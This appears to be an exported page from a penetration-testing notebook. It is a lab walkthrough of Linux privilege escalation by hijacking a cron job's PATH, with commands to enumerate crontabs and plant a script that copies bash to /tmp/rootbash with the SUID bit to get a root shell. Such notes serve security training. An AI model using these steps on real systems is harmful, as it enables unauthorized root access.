<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PATH environment variable</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PATH environment variable</h1><br/><br />• The crontab PATH environment variable is by default set to:<br />   ◇ /usr/bin:/bin<br />• The PATH variable can be overwritten in the crontab file.<br />• If a cron job program/script does not use an absolute path, and one of the PATH directories is writable by our user, we may be able to create a program/script with the same name as the cron job<br />0.  <a href="entest--Post_Exploitation--Privilege_Escalation--Linux_Privilege_Escalation--Automated_Recon_with_Tools--Linux_Smart_Enumeration_(lse.sh).html">Linux Smart Enumeration(lse.sh)</a><br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;./lse.sh&nbsp;-l&nbsp;1&nbsp;-i&nbsp;|&nbsp;more</div></div><br />    <a href=""><img src="images/1303-1.png" alt="images/1303-1.png" /></a><br />1. View the <span style="color:#1e90ff;">cronJobs</span> of the system-wide crontab:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;cat&nbsp;/etc/crontab</div></div><br />    <a href=""><img src="images/1303-2.png" alt="images/1303-2.png" /></a><br />   ◇ <span style="color:#1e90ff;">CronJobs</span>:<br />      ▪ overwrite.sh<br />         - Note that it does not use an absolute path<br />         - <span style="color:#a020f0;">/home/user</span> directory (which we can write to) is at the start of the PATH variable<br />      ▪ /usr/local/bin/compress.sh<br />2. Create the file <span style="color:#1e90ff;">overwrite.sh</span> in <span style="color:#a020f0;">/home/user</span> with the following contents:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;vim&nbsp;/home/user/overwrite.sh</div></div><br />    <div class="codebox"><div class="codebox">#!/bin/bash<br /><br />cp&nbsp;/bin/bash&nbsp;/tmp/rootbash<br />chmod&nbsp;+s&nbsp;/tmp/rootbash</div></div><br />3. Ensure that overwrite.sh is executable:<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;chmod&nbsp;+x&nbsp;/home/user/overwrite.sh</div></div><br />4. Wait for the <span style="color:#1e90ff;">cronjob</span> to run and for the /tmp/rootbash file to be created<br />5.  execute /tmp/rootbash (with -p to preserve the effective UID) to gain a root shell<br />    <div class="codebox"><div class="codebox">target@debian:~$&nbsp;/tmp/rootbash&nbsp;–p</div></div><br />    <a href=""><img src="images/1303-3.png" alt="images/1303-3.png" /></a><br /></div>
</body>
</html>
